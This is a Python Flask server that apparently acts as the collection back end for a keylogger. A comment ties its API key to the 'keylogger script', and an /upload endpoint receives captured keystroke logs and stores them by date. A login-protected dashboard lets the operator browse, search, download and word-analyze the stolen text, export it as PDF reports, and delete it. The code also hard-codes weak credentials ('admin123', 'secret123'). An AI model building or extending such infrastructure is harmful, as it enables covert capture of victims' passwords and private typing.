from flask import Flask, request, jsonify, send_from_directory, render_template_string, render_template, redirect, url_for, session
import re
from datetime import datetime, timedelta
from pathlib import Path
import shutil
import os
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from analysis_engine import analyze_text
from flask import send_file
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4

reports_dir = Path("reports")
reports_dir.mkdir(exist_ok=True)

app = Flask(__name__)
app.secret_key = "super_secret_key_change_this"
DATABASE = "database.db"

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()

init_db()

def update_user_table():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    try:
        c.execute("ALTER TABLE users ADD COLUMN failed_attempts INTEGER DEFAULT 0")
    except:
        pass

    try:
        c.execute("ALTER TABLE users ADD COLUMN lock_until TEXT")
    except:
        pass

    conn.commit()
    conn.close()

update_user_table()

def create_admin():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    username = "admin"
    password = generate_password_hash("admin123")

    try:
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        print("Admin created.")
    except sqlite3.IntegrityError:
        print("Admin already exists.")

    conn.close()

create_admin()

def generate_pdf_report(title, analysis_data, save_path):

    doc = SimpleDocTemplate(str(save_path), pagesize=A4)
    elements = []
    styles = getSampleStyleSheet()

    elements.append(Paragraph(title, styles["Heading1"]))
    elements.append(Spacer(1, 20))

    # Basic Stats
    data = [
        ["Total Characters", analysis_data["total_chars"]],
        ["Total Words", analysis_data["total_words"]],
        ["Total Lines", analysis_data["total_lines"]],
    ]

    table = Table(data)
    table.setStyle(TableStyle([
        ("GRID", (0, 0), (-1, -1), 1, colors.grey),
    ]))

    elements.append(table)
    elements.append(Spacer(1, 20))

    elements.append(Paragraph("Top 10 Words:", styles["Heading2"]))
    elements.append(Spacer(1, 10))

    for word, count in analysis_data["top_words"]:
        elements.append(Paragraph(f"{word} : {count}", styles["Normal"]))

    doc.build(elements)

# ---------------------------
# LOGIN REQUIRED DECORATOR
# ---------------------------

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

log_dir = Path("server_logs")
log_dir.mkdir(exist_ok=True)

API_KEY = "secret123"  # Must match with keylogger script; required for delete operations too

@app.route("/")
def home():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return redirect(url_for("view_log_folders"))

# ---------- Upload ----------
@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    if not data or data.get("api_key") != API_KEY:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    content = data.get("log", "")
    if not content.strip():
        print("[⚠️ EMPTY LOG RECEIVED]")
        return jsonify({"status": "error", "message": "Empty log"}), 400

    now = datetime.now()
    date_folder = log_dir / now.strftime('%d-%m-%Y')
    date_folder.mkdir(parents=True, exist_ok=True)

    time_stamp = now.strftime('%I-%M %p')  # format: HH-MM AM/PM
    filename = date_folder / f"{time_stamp}.txt"

    # Ensure uniqueness: append " - N" if filename exists
    if filename.exists():
        counter = 1
        while True:
            alt = date_folder / f"{time_stamp} - {counter}.txt"
            if not alt.exists():
                filename = alt
                break
            counter += 1

    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)

    print(f"[📥 RECEIVED @ {time_stamp}] {content[:100].replace(chr(10), ' ')}...")
    print(f"[📁 SAVED TO] {filename.resolve()}")

    return jsonify({"status": "success", "message": f"Log saved: {filename.name}"}), 200


# ---------- Helper: safe path check ----------
def _safe_within_logs(target: Path) -> bool:
    try:
        return str(target.resolve()).startswith(str(log_dir.resolve()))
    except Exception:
        return False


# ---------- View all log folders (stable: parse folder name dd-mm-yyyy) ----------
@app.route("/view-logs")
@login_required
def view_log_folders():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    folders = [p for p in log_dir.iterdir() if p.is_dir()]

    def parse_folder_date(p: Path):
        try:
            return datetime.strptime(p.name, "%d-%m-%Y")
        except Exception:
            return datetime.fromtimestamp(p.stat().st_mtime)

    folders.sort(key=parse_folder_date, reverse=True)
    logs = [(folder.name, len(list(folder.glob("*.txt")))) for folder in folders]

    return render_template_string("""
    <html>
    <head>
        <title>📁 Server Log Folders</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            :root { --bg-color: #f5f5f5; --text-color: #121212; --box-bg: #ffffff; --muted:#666; }
            html.dark { --bg-color: #121212; --text-color: #f5f5f5; --box-bg: #1e1e1e; --muted:#aaa; }
            body { font-family: Arial, sans-serif; background-color: var(--bg-color); color: var(--text-color); padding: 24px 28px; transition: background-color .2s, color .2s; }
            .wrap { width: 100%; max-width: none; }
            .controls { margin-bottom: 16px; display:flex; gap:12px; align-items:center; }

            .btn {
                background:#007bff;color:#fff;padding:8px 12px;border-radius:8px;border:none;cursor:pointer;font-weight:600;
                text-decoration: none !important; display:inline-flex; align-items:center; gap:8px;
            }
            a.btn { text-decoration: none !important; } /* ensure anchors don't underline */
            .btn.danger { background:#e55353; }
            .btn:hover { filter: brightness(0.95); text-decoration:none !important; }

            h2 { display:flex; align-items:center; gap:10px; margin: 8px 0 14px; font-size:24px; }
            .folder-list { list-style:none; padding:0; margin:0; width: 100%; }

            .folder-item {
                display:flex;
                justify-content:space-between;
                align-items:center;
                gap:12px;
                padding:14px 18px;
                margin:10px 0;
                border-radius:10px;
                border:1px solid rgba(255,255,255,0.06);
                background: var(--box-bg);
                box-shadow: 0 1px 0 rgba(255,255,255,0.02) inset;
                width: calc(100% - 0px);
            }

            /* Only non-.btn anchor uses blue color; keep .btn anchors white for contrast */
            .folder-item a:not(.btn) { color:#0b84ff; font-weight:700; text-decoration:none; }
            .folder-item a.btn, .folder-item a.btn * { color: #fff !important; } /* enforce white text for button anchors */
            .folder-item .info { color:var(--muted); margin-left:8px; font-weight:500; }

            @media (max-width:700px){ .folder-item{flex-direction:column;align-items:flex-start} }
            .top-bar {
                position:relative;
                display:flex;
                align-items:center;
                height:60px;
                margin-bottom:20px;
            }

            .menu-wrapper {
                position:relative;
            }

            .dropdown {
                display:none;
                position:absolute;
                left:0;
                top:45px;
                background:var(--box-bg);
                min-width:200px;
                border-radius:8px;
                box-shadow:0 8px 20px rgba(0,0,0,0.15);
                overflow:hidden;
                z-index:100;
            }

            .dropdown a {
                display:block;
                padding:12px 16px;
                text-decoration:none;
                color:var(--text-color);
            }

            .dropdown a:hover {
                background:rgba(0,0,0,0.06);
            }
                                  
            .left-menu {
                z-index:2;
            }

            .center-title {
                position:absolute;
                left:50%;
                transform:translateX(-50%);
                font-size:22px;
                font-weight:600;
            }
        </style>
    </head>
    <body>
        <div class="wrap">
            <div class="top-bar">

                <div class="left-menu">
                    <div class="menu-wrapper">
                        <button class="btn" onclick="toggleMenu()">☰</button>

                        <div class="dropdown" id="dropdownMenu">
                            <a href="/dashboard">📊 Dashboard</a>
                            <a href="/change-password">🔐 Change Password</a>
                            <a href="#" id="themeToggle" onclick="toggleTheme()">🌙 Dark Theme</button>
                            <a href="/logout">🚪 Logout</a>
                        </div>
                    </div>
                </div>

                <div class="center-title">
                    📁 ORGANIZED SERVER LOGS
                </div>

            </div>

        </div>

            

            <ul class="folder-list">
            {% for date, count in logs %}
                <li class="folder-item">
                    <div>
                        <a class="btn" href="/view-logs/{{ date }}">📁 {{ date }}</a>
                        <span class="info"> - {{ count }} logs</span>
                    </div>
                    <div>
                        <button class="btn danger" onclick="deleteFolder('{{ date }}')">🗑️ Delete Folder</button>
                    </div>
                </li>
            {% endfor %}
            </ul>
        </div>

        <script>
            function applyTheme(theme){ document.documentElement.className = theme; const b=document.getElementById("themeToggle"); if(b) b.innerText = theme==='dark' ? '☀️ Light Theme' : '🌙 Dark Theme'; }
            function toggleTheme(){ const cur = localStorage.getItem("theme")||"light"; const next = cur==='dark' ? 'light' : 'dark'; localStorage.setItem("theme", next); applyTheme(next); }

            // --- Auto-theme sync initializer ---
            function initThemeAutoSync() {
                const stored = localStorage.getItem("theme");
                if (stored) {
                    applyTheme(stored);
                } else {
                    const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
                    applyTheme(prefersDark ? 'dark' : 'light');
                    if (window.matchMedia) {
                        const mq = window.matchMedia('(prefers-color-scheme: dark)');
                        const changeHandler = (e) => {
                            if (!localStorage.getItem("theme")) {
                                applyTheme(e.matches ? 'dark' : 'light');
                            }
                        };
                        if (typeof mq.addEventListener === 'function') mq.addEventListener('change', changeHandler);
                        else if (typeof mq.addListener === 'function') mq.addListener(changeHandler);
                    }
                }
            }
            // use initializer instead of direct applyTheme(...)
            initThemeAutoSync();

            async function deleteFolder(date){
                if(!confirm(`Delete entire folder for ${date} and all its logs?`)) return;
                const key = prompt("Enter API key to authorize deletion:");
                if(!key) return alert("Deletion cancelled (no API key).");
                try {
                    const res = await fetch(`/delete-folder/${encodeURIComponent(date)}`, {
                        method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({api_key:key})
                    });
                    const j = await res.json();
                    if(res.ok){ alert(j.message||"Deleted"); location.reload(); } else alert(j.message||"Delete failed");
                } catch(e){ alert("Network error: "+e); }
            }
            function toggleMenu() {
                const menu = document.getElementById("dropdownMenu");
                menu.style.display = menu.style.display === "block" ? "none" : "block";
            }

            // Close if clicked outside
            document.addEventListener("click", function(event) {
                const menu = document.getElementById("dropdownMenu");
                if (!event.target.closest(".menu-wrapper")) {
                    if(menu) menu.style.display = "none";
                }
            });
        </script>
    </body>
    </html>
    """, logs=logs)


# ---------- View logs inside a specific folder (stable: parse filename time) ----------
@app.route("/view-logs/<date>")
@login_required
def view_logs_by_date(date):
    folder = log_dir / date
    if not folder.exists():
        return "Date folder not found", 404

    files = [f for f in folder.glob("*.txt") if f.is_file()]

    time_regex = re.compile(r'^(\d{2}-\d{2} [AP]M)(?: - (\d+))?')

    def parse_file_time(f: Path):
        m = time_regex.match(f.name)
        if m:
            time_part = m.group(1)
            suffix = int(m.group(2) or "0")
            try:
                dt = datetime.strptime(f"{date} {time_part}", "%d-%m-%Y %I-%M %p")
                return (dt, suffix)
            except:
                pass
        return (datetime.fromtimestamp(f.stat().st_mtime), 0)

    files.sort(key=parse_file_time, reverse=True)
    file_count = len(files)

    return render_template_string("""
    <html>
    <head>
        <title>📂 Logs for {{ date }}</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            :root { --bg-color: #f5f5f5; --text-color: #121212; --box-bg: #ffffff; --muted:#666; }
            html.dark { --bg-color: #121212; --text-color: #f5f5f5; --box-bg: #1e1e1e; --muted:#aaa; }
            body { font-family: Arial, sans-serif; background-color: var(--bg-color); color: var(--text-color); padding: 24px 28px; transition: background-color .2s, color .2s; }
            .wrap { width:100%; max-width:none; }
            .top { display:flex; gap:12px; align-items:center; margin-bottom:18px; flex-wrap:wrap; }

            .btn {
                background:#007bff;color:#fff;padding:8px 12px;border-radius:8px;border:none;cursor:pointer;font-weight:600;
                text-decoration:none !important; display:inline-flex; align-items:center; gap:8px;
            }
            a.btn { text-decoration:none !important; }
            .btn.danger { background:#e55353; }
            .btn:hover { filter: brightness(0.95); text-decoration:none !important; }

            #searchBox { padding:8px 12px;border-radius:8px;border:1px solid #ccc; min-width:260px; }
            h2 { display:flex; align-items:center; gap:10px; margin: 8px 0 12px; font-size:22px; }

            .folder-header {
                display:flex; justify-content:space-between; align-items:center; padding:14px 18px; margin-bottom:14px; border-radius:10px; background:var(--box-bg); border:1px solid rgba(255,255,255,0.06);
            }

            /* allow non-button anchors to be blue, but keep .btn white */
            .folder-header a:not(.btn) { color:#0b84ff; font-weight:700; text-decoration:none; }
            .folder-header a.btn, .folder-header a.btn * { color: #fff !important; }

            .folder-header .info { color:var(--muted); margin-left:8px; font-weight:500; }

            .list { list-style:none; padding:0; margin:0; width:100%; }
            .file-row {
                display:flex; align-items:center; justify-content:space-between;
                padding:12px 16px; margin:10px 0; border-radius:8px;
                background: var(--box-bg); border:1px solid rgba(255,255,255,0.04);
            }
            .file-name { font-size:16px; font-weight:500; }
            .controls { display:flex; gap:10px; align-items:center; }
            .controls .btn { min-width:86px; display:inline-flex; justify-content:center; gap:8px; border-radius:8px; padding:8px 12px; }
            @media (max-width:720px) {
                .file-row{flex-direction:column;align-items:flex-start}
                .controls{width:100%; margin-top:8px; justify-content:flex-start}
            }
        </style>
    </head>
    <body>
        <div class="wrap">
            <div class="top">
                <a class="btn" href="/view-logs">⬅ Back to All Folders</a>
                <div style="margin-left:auto; display:flex; gap:10px;">
                </div>
                <input id="searchBox" placeholder="🔍 Search file names..." oninput="filterList()" />
            </div>

            <div class="folder-header">
                <div>
                    <a class="btn"
                        href="/analysis/day/{{ date }}">
                        📊 Analyze Entire Day
                    </a>
                    <a class="btn" href="/view-logs/{{ date }}">📁 {{ date }}</a>
                    <span class="info"> - {{ file_count }} logs</span>
                </div>
                <div>
                    <button class="btn danger" onclick="deleteFolder('{{ date }}')">🗑️ Delete Folder</button>
                </div>
            </div>

            <h2>📂 Logs for {{ date }}</h2>

            <ul class="list" id="fileList">
            {% for file in files %}
                <li class="file-row" data-name="{{ file.name|lower }}">
                    <div class="file-name">{{ file.name }}</div>
                    <div class="controls">
                        <a class="btn" href="/read-log/{{ date }}/{{ file.name|urlencode }}">
                            View
                        </a>

                        <a class="btn" href="/download-log/{{ date }}/{{ file.name|urlencode }}">
                            Download
                        </a>

                        <a class="btn" href="/analysis/log/{{ date }}/{{ file.name|urlencode }}">
                            🔎 Analyze
                        </a>

                        <button class="btn danger"
                            onclick="deleteFile('{{ date }}','{{ file.name }}', this)">
                            🗑️ Delete
                        </button>
                    </div>
                </li>
            {% endfor %}
            </ul>
        </div>

        <script>
            function applyTheme(theme){ document.documentElement.className = theme; const b=document.getElementById("themeToggle"); if(b) b.innerText = theme==='dark' ? '☀️ Light Theme' : '🌙 Dark Theme'; }
            function toggleTheme(){ const cur = localStorage.getItem("theme")||"light"; const next = cur==='dark' ? 'light' : 'dark'; localStorage.setItem("theme", next); applyTheme(next); }

            // --- Auto-theme sync initializer ---
            function initThemeAutoSync() {
                const stored = localStorage.getItem("theme");
                if (stored) {
                    applyTheme(stored);
                } else {
                    const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
                    applyTheme(prefersDark ? 'dark' : 'light');
                    if (window.matchMedia) {
                        const mq = window.matchMedia('(prefers-color-scheme: dark)');
                        const changeHandler = (e) => {
                            if (!localStorage.getItem("theme")) {
                                applyTheme(e.matches ? 'dark' : 'light');
                            }
                        };
                        if (typeof mq.addEventListener === 'function') mq.addEventListener('change', changeHandler);
                        else if (typeof mq.addListener === 'function') mq.addListener(changeHandler);
                    }
                }
            }
            initThemeAutoSync();

            function filterList(){
                const q = document.getElementById("searchBox").value.toLowerCase();
                document.querySelectorAll("#fileList .file-row").forEach(it=>{
                    it.style.display = it.getAttribute("data-name").includes(q) ? "" : "none";
                });
            }

            async function deleteFile(date, filename, btnElem){
                if(!confirm(`Delete file ${filename}?`)) return;
                const key = prompt("Enter API key to authorize deletion:");
                if(!key) return alert("Deletion cancelled (no API key).");
                try {
                    const res = await fetch(`/delete-log/${encodeURIComponent(date)}/${encodeURIComponent(filename)}`, {
                        method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({api_key:key})
                    });
                    const j = await res.json();
                    if(res.ok){ alert(j.message||"Deleted"); const li=btnElem.closest(".file-row"); if(li) li.remove(); } else alert(j.message||"Failed");
                } catch(e){ alert("Network error:"+e); }
            }

            async function deleteFolder(date){
                if(!confirm(`Delete entire folder for ${date} and all its logs?`)) return;
                const key = prompt("Enter API key to authorize deletion:");
                if(!key) return alert("Deletion cancelled (no API key).");
                try {
                    const res = await fetch(`/delete-folder/${encodeURIComponent(date)}`, {
                        method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({api_key:key})
                    });
                    const j = await res.json();
                    if(res.ok){ alert(j.message||"Deleted"); window.location.href="/view-logs"; } else alert(j.message||"Failed");
                } catch(e){ alert("Network error:"+e); }
            }
        </script>
    </body>
    </html>
    """, date=date, files=files, file_count=file_count)



# ---------- Download ----------
@app.route("/download-log/<date>/<filename>")
@login_required
def download_log(date, filename):
    folder = log_dir / date
    return send_from_directory(folder, filename, as_attachment=True)


# ---------- Read single log (clean UI & theme fix) ----------
@app.route("/read-log/<date>/<filename>")
@login_required
def read_log(date, filename):
    path = log_dir / date / filename
    if not path.exists():
        return "Log not found", 404

    # read file content
    content = path.read_text(encoding="utf-8")

    # render template (escaped content, JS will read it from DOM)
    return render_template_string("""
    <html>
    <head>
        <title>{{ filename }}</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            :root { --bg-color:#f5f5f5; --text-color:#121212; --box-bg:#ffffff; --muted:#666; }
            html.dark { --bg-color:#121212; --text-color:#f5f5f5; --box-bg:#1e1e1e; --muted:#aaa; }

            body {
                margin:0;
                font-family: 'Courier New', monospace;
                background: var(--bg-color);
                color: var(--text-color);
                padding: 28px;
                transition: background .18s, color .18s;
            }

            .top-bar {
                display:flex;
                flex-wrap:wrap;
                gap:10px;
                align-items:center;
                margin-bottom:18px;
            }

            .btn {
                background:#007bff;
                color:#fff;
                border:none;
                padding:8px 14px;
                border-radius:6px;
                font-weight:700;
                cursor:pointer;
                text-decoration:none;
                display:inline-flex;
                gap:8px;
                align-items:center;
            }
            .btn.danger { background:#dc3545; }
            .btn:active { transform: translateY(1px); }

            #searchBox {
                display:block;
                margin:8px 0 18px 0;
                padding:10px;
                width:360px;
                max-width:100%;
                border-radius:8px;
                border:1px solid #ccc;
                background: var(--box-bg);
                color: var(--text-color);
            }

            h2 { margin-top:0; font-size:20px; }

            .log-box {
                margin-top:10px;
                background: var(--box-bg);
                color: var(--text-color);
                border: 1px solid rgba(0,0,0,0.12);
                border-radius: 8px;
                padding: 16px;
                white-space: pre-wrap;
                line-height: 1.45;
                max-height: 75vh;
                overflow-y: auto;
                overflow-x: hidden;
                position: relative;
                z-index: 0;
                box-shadow: 0 6px 20px rgba(0,0,0,0.08);
            }

            .log-box * { pointer-events: auto; }

            @media (max-width:720px) {
                body { padding: 16px; }
                #searchBox { width: 100%; }
            }
        </style>
    </head>
    <body>
        <div class="top-bar" id="topBar" style="display:flex; align-items:center;">

            <!-- LEFT SIDE BUTTONS -->
            <div style="display:flex; gap:10px;">
                <a class="btn" href="/view-logs/{{ date }}">⬅ Back</a>

                <a class="btn"
                href="/analysis/log/{{ date }}/{{ filename|urlencode }}">
                🔎 Analyze
                </a>

            </div>

            <!-- RIGHT SIDE DELETE -->
            <div style="margin-left:auto;">
                <button class="btn danger"
                        id="deleteBtn"
                        type="button">
                    🗑 Delete This File
                </button>
            </div>

        </div>

        <input id="searchBox" placeholder="🔍 Search logs..." oninput="searchLog()" />

        <h2>{{ filename }}</h2>

        <!-- ESCAPED content: show raw text safely so browser doesn't interpret any braces or tags -->
        <div class="log-box" id="logContent">{{ content | e }}</div>

        <script>
            // THEME: apply to <html>
            function applyTheme(theme) {
                if (theme === 'dark') document.documentElement.classList.add('dark');
                else document.documentElement.classList.remove('dark');
                const btn = document.getElementById('themeBtn');
                if (btn) btn.innerText = theme === 'dark' ? '☀️ Light Theme' : '🌙 Dark Theme';
            }
            function toggleTheme() {
                const cur = localStorage.getItem('theme') || 'light';
                const next = cur === 'dark' ? 'light' : 'dark';
                localStorage.setItem('theme', next);
                applyTheme(next);
            }

            // --- Auto-theme sync initializer ---
            function initThemeAutoSync() {
                const stored = localStorage.getItem("theme");
                if (stored) {
                    applyTheme(stored);
                } else {
                    const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
                    applyTheme(prefersDark ? 'dark' : 'light');
                    if (window.matchMedia) {
                        const mq = window.matchMedia('(prefers-color-scheme: dark)');
                        const changeHandler = (e) => {
                            if (!localStorage.getItem("theme")) {
                                applyTheme(e.matches ? 'dark' : 'light');
                            }
                        };
                        if (typeof mq.addEventListener === 'function') mq.addEventListener('change', changeHandler);
                        else if (typeof mq.addListener === 'function') mq.addListener(changeHandler);
                    }
                }
            }
            initThemeAutoSync();

            // Attach event listeners after DOM loaded
            document.addEventListener('DOMContentLoaded', function() {
                // theme button
                const themeBtn = document.getElementById('themeBtn');
                if (themeBtn) themeBtn.addEventListener('click', function(e){ e.stopPropagation(); toggleTheme(); });

                // delete button
                const deleteBtn = document.getElementById('deleteBtn');
                if (deleteBtn) {
                    deleteBtn.addEventListener('click', async function(e){
                        e.stopPropagation();
                        if (!confirm("Delete this log file?")) return;
                        const key = prompt("Enter API key to authorize deletion:");
                        if (!key) return alert("Deletion cancelled (no API key).");
                        try {
                            const res = await fetch(`/delete-log/${encodeURIComponent('{{ date }}')}/${encodeURIComponent('{{ filename }}')}`, {
                                method: "POST",
                                headers: {"Content-Type":"application/json"},
                                body: JSON.stringify({ api_key: key })
                            });
                            const j = await res.json();
                            if (res.ok) {
                                alert(j.message || "Deleted");
                                window.location.href = "/view-logs/{{ date }}";
                            } else {
                                alert(j.message || "Failed to delete");
                            }
                        } catch (err) {
                            alert("Network error: " + err);
                        }
                    });
                }
            });

            // SEARCH: build original lines from DOM text, not from an inlined JS string
            function escapeHTML(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

            function getOriginalLines() {
                // read from the DOM's innerText so we avoid any unescaped JS content
                const box = document.getElementById('logContent');
                // innerText preserves newlines — split by \n
                return box ? box.innerText.split('\\n') : [];
            }

            function searchLog(){
                const q = document.getElementById('searchBox').value.toLowerCase();
                const box = document.getElementById('logContent');
                const original = getOriginalLines();
                if (!q) { box.innerHTML = original.map(escapeHTML).join('<br>'); return; }
                const result = original.filter(line => line.toLowerCase().includes(q))
                    .map(line => escapeHTML(line).replace(new RegExp(`(${q})`, 'gi'), "<mark>$1</mark>"));
                box.innerHTML = result.join('<br>');
            }
        </script>
    </body>
    </html>
    """, date=date, filename=filename, content=content)

# ---------- Delete endpoints (require API_KEY in JSON body) ----------
@app.route("/delete-log/<date>/<filename>", methods=["POST"])
@login_required
def delete_log(date, filename):
    data = request.get_json() or {}
    if data.get("api_key") != API_KEY:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    target = log_dir / date / filename
    if not _safe_within_logs(target) or not target.exists():
        return jsonify({"status": "error", "message": "File not found or invalid path"}), 404

    try:
        target.unlink()
        return jsonify({"status": "success", "message": f"Deleted {filename}"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": f"Delete failed: {e}"}), 500

@app.route("/delete-folder/<date>", methods=["POST"])
@login_required
def delete_folder(date):
    data = request.get_json() or {}
    if data.get("api_key") != API_KEY:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    folder = log_dir / date
    if not _safe_within_logs(folder) or not folder.exists():
        return jsonify({"status": "error", "message": "Folder not found or invalid path"}), 404

    try:
        shutil.rmtree(folder)
        return jsonify({"status": "success", "message": f"Deleted folder {date}"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": f"Delete folder failed: {e}"}), 500

# ---------------------------
# LOGIN SYSTEM (Basic Start)
# ---------------------------

@app.route("/login", methods=["GET", "POST"])
def login():
    MAX_ATTEMPTS = 3
    LOCK_MINUTES = 1

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()

        c.execute("""
            SELECT id, password, failed_attempts, lock_until
            FROM users WHERE username = ?
        """, (username,))
        user = c.fetchone()

        if not user:
            conn.close()
            return render_template("login.html", error="Invalid credentials")

        user_id, stored_hash, failed_attempts, lock_until = user

        # 🔒 Check lock
        if lock_until:
            lock_time = datetime.fromisoformat(lock_until)
            if datetime.now() < lock_time:
                remaining = int((lock_time - datetime.now()).total_seconds())
                conn.close()
                return render_template("login.html", lock_remaining=remaining)

        # ✅ Correct password
        if check_password_hash(stored_hash, password):
            c.execute("""
                UPDATE users
                SET failed_attempts = 0, lock_until = NULL
                WHERE id = ?
            """, (user_id,))
            conn.commit()
            conn.close()

            session["logged_in"] = True
            session["user_id"] = user_id
            return redirect(url_for("view_log_folders"))

        # ❌ Wrong password
        failed_attempts += 1

        if failed_attempts >= MAX_ATTEMPTS:
            lock_time = datetime.now().replace(microsecond=0) + timedelta(minutes=LOCK_MINUTES)
            c.execute("""
                UPDATE users
                SET failed_attempts = ?, lock_until = ?
                WHERE id = ?
            """, (failed_attempts, lock_time.isoformat(), user_id))

            conn.commit()
            remaining = int((lock_time - datetime.now()).total_seconds())
            conn.close()

            return render_template("login.html", lock_remaining=remaining)

        else:
            c.execute("""
                UPDATE users
                SET failed_attempts = ?
                WHERE id = ?
            """, (failed_attempts, user_id))

            attempts_left = MAX_ATTEMPTS - failed_attempts
            conn.commit()
            conn.close()

            return render_template(
                "login.html",
                error=f"Invalid credentials. Attempts left: {attempts_left}"
            )

    # 🔥 VERY IMPORTANT: Handle GET request
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ---------------------------
# CHANGE PASSWORD
# ---------------------------

@app.route("/change-password", methods=["GET", "POST"])
@login_required
def change_password():
    if request.method == "POST":
        old_password = request.form.get("old_password")
        new_password = request.form.get("new_password")

        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute("SELECT password FROM users WHERE id = ?", (session["user_id"],))
        user = c.fetchone()

        if not user or not check_password_hash(user[0], old_password):
            conn.close()
            return render_template("change_password.html", error="Incorrect current password")

        new_hash = generate_password_hash(new_password)
        c.execute("UPDATE users SET password = ? WHERE id = ?", (new_hash, session["user_id"]))
        conn.commit()
        conn.close()

        return render_template("change_password.html", success="Password updated successfully!")

    return render_template("change_password.html")

# ---------------------------
# Single Log Analysis Route
# ---------------------------

@app.route("/analysis/log/<date>/<filename>")
@login_required
def analyze_single_log(date, filename):

    path = log_dir / date / filename
    if not path.exists():
        return "Log not found", 404

    content = path.read_text(encoding="utf-8")
    result = analyze_text(content)

    return render_template(
        "analysis.html",
        analysis=result,
        date=date,
        filename=filename,
        full_day=False
    )

# ---------------------------
# Full Day Log Analysis Route
# ---------------------------

@app.route("/analysis/day/<date>")
@login_required
def analyze_day_logs(date):

    folder = log_dir / date

    if not folder.exists():
        return "Folder not found", 404

    combined_text = ""

    # read all txt files
    for file in folder.glob("*.txt"):
        combined_text += file.read_text(encoding="utf-8") + "\n"

    result = analyze_text(combined_text)

    return render_template(
        "analysis.html",
        analysis=result,
        date=date,
        filename=None,
        full_day=True
    )

# ---------------------------
# DASHBOARD 
# ---------------------------

@app.route("/dashboard")
@login_required
def dashboard():

    total_logs = 0
    total_words = 0
    total_characters = 0
    day_counts = {}

    for folder in log_dir.iterdir():
        if folder.is_dir():
            file_count = 0
            for file in folder.glob("*.txt"):
                content = file.read_text(encoding="utf-8")
                total_logs += 1
                total_characters += len(content)
                total_words += len(content.split())
                file_count += 1

            day_counts[folder.name] = file_count

    most_active_day = max(day_counts, key=day_counts.get) if day_counts else "N/A"

    return render_template(
        "dashboard.html",
        total_logs=total_logs,
        total_words=total_words,
        total_characters=total_characters,
        most_active_day=most_active_day,
        day_counts=day_counts
    )

# ---------------------------
# Single Log Report
# ---------------------------

@app.route("/generate-report/log/<date>/<filename>")
@login_required
def generate_log_report(date, filename):

    path = log_dir / date / filename
    if not path.exists():
        return "File not found", 404

    # Read and analyze
    content = path.read_text(encoding="utf-8")
    result = analyze_text(content)

    # Create date folder inside reports
    date_folder = reports_dir / date
    date_folder.mkdir(exist_ok=True)

    # Clean filename for report
    report_name = f"{filename}_report.pdf"
    report_path = date_folder / report_name

    # Generate PDF file
    generate_pdf_report(
        f"Log Report - {filename}",
        result,
        report_path
    )

    # Return file for download
    return send_file(
        report_path,
        as_attachment=True,
        download_name=report_name,
        mimetype="application/pdf"
    )

# ---------------------------
# Full Day Log Report
# ---------------------------

@app.route("/generate-report/day/<date>")
@login_required
def generate_day_report(date):

    folder = log_dir / date

    if not folder.exists():
        return "Folder not found", 404

    combined_text = ""

    for file in folder.glob("*.txt"):
        combined_text += file.read_text(encoding="utf-8") + "\n"

    result = analyze_text(combined_text)

    date_folder = reports_dir / date
    date_folder.mkdir(exist_ok=True)

    report_name = f"{date}_full_day_report.pdf"
    report_path = date_folder / report_name

    generate_pdf_report(
        f"Full Day Log Report - {date}",
        result,
        report_path
    )

    return send_file(
        report_path,
        as_attachment=True,
        download_name=report_name,
        mimetype="application/pdf"
    )

# ---------- Run Server ----------
if __name__ == "__main__":
    print("SERVER LOG FOLDER →", log_dir.resolve())
    app.run(host="0.0.0.0", port=5000)
